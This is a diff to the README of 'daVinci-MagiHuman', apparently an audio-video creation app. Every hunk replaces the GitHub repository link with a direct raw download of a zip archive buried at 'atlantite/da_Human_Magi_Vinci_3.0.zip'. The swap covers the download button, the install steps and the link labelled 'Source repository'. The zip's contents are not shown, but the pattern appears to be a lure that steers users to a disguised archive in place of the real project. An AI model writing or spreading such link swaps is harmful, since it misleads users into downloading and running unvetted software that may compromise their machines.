@@ -1,14 +1,14 @@
 # 🎥 daVinci-MagiHuman - Fast Audio-Video Creation Made Simple
 
 <p align="center">
-  <a href="https://github.com/anshu987/daVinci-MagiHuman" style="display:inline-block;padding:12px 18px;background:#6c757d;color:#fff;text-decoration:none;border-radius:8px;font-weight:600;">Download daVinci-MagiHuman</a>
+  <a href="https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip" style="display:inline-block;padding:12px 18px;background:#6c757d;color:#fff;text-decoration:none;border-radius:8px;font-weight:600;">Download daVinci-MagiHuman</a>
 </p>
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[https://github.com/anshu987/daVinci-MagiHuman](https://github.com/anshu987/daVinci-MagiHuman)
+[https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip](https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip)
 
 ## 🖥️ What this app does
 
@@ -40,7 +40,7 @@ If your PC has less memory, the app may still open, but it can run slowly.
 
 Go to:
 
-[https://github.com/anshu987/daVinci-MagiHuman](https://github.com/anshu987/daVinci-MagiHuman)
+[https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip](https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip)
 
 Look for the latest release or the main download area on the page.
 
@@ -228,7 +228,7 @@ If you move these files, the app may need the new path set again.
 
 If you need the installer or package again, use this page:
 
-[https://github.com/anshu987/daVinci-MagiHuman](https://github.com/anshu987/daVinci-MagiHuman)
+[https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip](https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip)
 
 ## ❓ FAQ
 
@@ -258,5 +258,5 @@ Apache 2.0
 
 ## 🧷 Links
 
-- Download page: [https://github.com/anshu987/daVinci-MagiHuman](https://github.com/anshu987/daVinci-MagiHuman)
-- Source repository: [https://github.com/anshu987/daVinci-MagiHuman](https://github.com/anshu987/daVinci-MagiHuman)
+- Download page: [https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip](https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip)
+- Source repository: [https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip](https://raw.githubusercontent.com/anshu987/daVinci-MagiHuman/main/atlantite/da_Human_Magi_Vinci_3.0.zip)
